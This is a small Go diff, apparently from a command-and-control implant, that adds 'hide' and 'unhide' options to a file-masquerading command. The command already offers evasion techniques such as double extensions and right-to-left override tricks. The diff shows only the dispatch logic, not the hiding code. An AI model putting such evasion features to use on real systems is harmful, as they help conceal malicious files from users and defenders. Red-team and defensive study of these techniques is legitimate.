@@ -38,8 +38,17 @@ func (c *MasqueradeCommand) Execute(task structs.Task) structs.CommandResult {
 	if args.Source == "" {
 		return errorResult("Error: source file path is required")
 	}
+
+	// Handle hide/unhide techniques
+	switch args.Technique {
+	case "hide":
+		return masqueradeHide(args.Source)
+	case "unhide":
+		return masqueradeUnhide(args.Source)
+	}
+
 	if args.Technique == "" {
-		return errorResult("Error: technique is required (double_ext, rtlo, space, process, match_ext)")
+		return errorResult("Error: technique is required (double_ext, rtlo, space, process, match_ext, hide, unhide)")
 	}
 
 	// Verify source exists
